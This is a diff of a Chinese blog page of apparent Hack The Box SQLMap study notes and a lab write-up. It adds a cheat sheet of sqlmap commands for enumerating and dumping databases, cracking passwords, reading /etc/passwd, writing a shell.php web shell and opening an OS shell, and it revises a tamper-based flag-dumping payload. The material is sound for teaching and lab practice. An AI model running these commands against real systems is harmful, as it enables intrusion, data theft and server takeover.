@@ -190,14 +190,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#ffa2c4>
+                <a href="/tags/base" style=color:#03a9f4>
                     base
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/tool" style=color:#00a596>
+                <a href="/tags/tool" style=color:#ffa2c4>
                     tool
                 </a>
             </span>
@@ -210,6 +210,115 @@
         <h2 id="GET-x2F-POST-Requests"><a href="#GET-x2F-POST-Requests" class="headerlink" title="GET&#x2F;POST Requests"></a>GET&#x2F;POST Requests</h2><p>在最常见的场景中，GET参数使用选项-u&#x2F;-url提供，如前一个示例所示。对于测试POST数据，可以使用–data标志，如下所示：</p>
 <span id="more"></span>
 
+<h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p>
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sqlmap -h</code></td>
+<td>查看基本帮助菜单</td>
+</tr>
+<tr>
+<td><code>sqlmap -hh</code></td>
+<td>查看高级帮助菜单</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/vuln.php?id=1&quot; --batch</code></td>
+<td>在不要求用户输入的情况下运行<code>SQLMap</code></td>
+</tr>
+<tr>
+<td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;</code></td>
+<td><code>SQLMap</code>带有开机自检请求</td>
+</tr>
+<tr>
+<td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;</code></td>
+<td>指定带星号的注入点的 POST 请求</td>
+</tr>
+<tr>
+<td><code>sqlmap -r req.txt</code></td>
+<td>将 HTTP 请求文件传递给<code>SQLMap</code></td>
+</tr>
+<tr>
+<td><code>sqlmap ... --cookie=&#39;PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#39;</code></td>
+<td>指定 Cookie 标头</td>
+</tr>
+<tr>
+<td><code>sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT</code></td>
+<td>指定 PUT 请求</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt</code></td>
+<td>将流量存储到输出文件</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch</code></td>
+<td>指定详细级别</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;</code></td>
+<td>指定前缀或后缀</td>
+</tr>
+<tr>
+<td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td>
+<td>指定级别和风险</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba</code></td>
+<td>基本数据库枚举</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb</code></td>
+<td>表枚举</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname</code></td>
+<td>表&#x2F;行枚举</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;</code></td>
+<td>条件枚举</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</code></td>
+<td>数据库架构枚举</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user</code></td>
+<td>搜索数据</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</code></td>
+<td>密码枚举和破解</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;</code></td>
+<td>反 CSRF 令牌绕过</td>
+</tr>
+<tr>
+<td><code>sqlmap --list-tampers</code></td>
+<td>列出所有篡改脚本</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba</code></td>
+<td>检查 DBA 权限</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;</code></td>
+<td>读取本地文件</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</code></td>
+<td>写入文件</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell</code></td>
+<td>生成操作系统外壳</td>
+</tr>
+</tbody></table>
 <pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;
 </code></pre>
 <p>在这种情况下，POST参数uid和name将针对SQLi漏洞进行测试。例如，如果我们有一个明确的指示，表明参数uid容易出现SQLi漏洞，我们可以使用-p uid将测试范围缩小到仅此参数。否则，我们可以使用特殊标记*在提供的数据中进行标记，如下所示：</p>
@@ -456,9 +565,18 @@ No output
 <p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142035598.png" alt="image-20230714203535534"></p>
 <p>这里显示有防火墙或者一些过滤规则，让程序接着跑一会，再开一个窗口试试常规的数据库检索，万一flag在数据库里呢？</p>
 <p>但是发现一样的卡住了，这里怎么说呢，还是只能取巧试一试之前的绕过方式，在之前的文档中用到的tamper这里也拥有一下（一般而言这个模块是这样的）……然后就好家伙，用between报错了没了hh~</p>
-<p>这里还是卡住了跑了二十分钟没反应了无语，最后查了一下最终的payload长这样：</p>
-<pre><code>sqlmap -r test.txt -D production -T final_flag --tamper=between --dbms=Mysql --technique=T --dump
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151001412.png" alt="image-20230715100131257">回显上两次提到了time-base，可以设定注入技术为T（technique&#x3D;T)，因为在mysql里拿到了库名，可以直接指定dbms&#x3D;Mysql</p>
+<p>最终的payload长这样：</p>
+<pre><code>sqlmap -r test.txt -D production -T final_flag --tamper=between --dbms=Mysql --technique=T --dump --no-cast
 </code></pre>
+<p>如果不加–no-cast或者–hex可能回显blank：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151019524.png" alt="image-20230715101944473"></p>
+<p>使用–no-cast后拿到flag：</p>
+<p>这里补充一下为什么会用到tamper&#x3D;between</p>
+<p>先正常-r</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151010044.png"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151011530.png" alt="image-20230715101140449"></p>
+<p>事实上，我用它提示的脚本也拿到了结果，但是根据回显使用更准确的脚本会节约时间</p>
 
     </div>
 
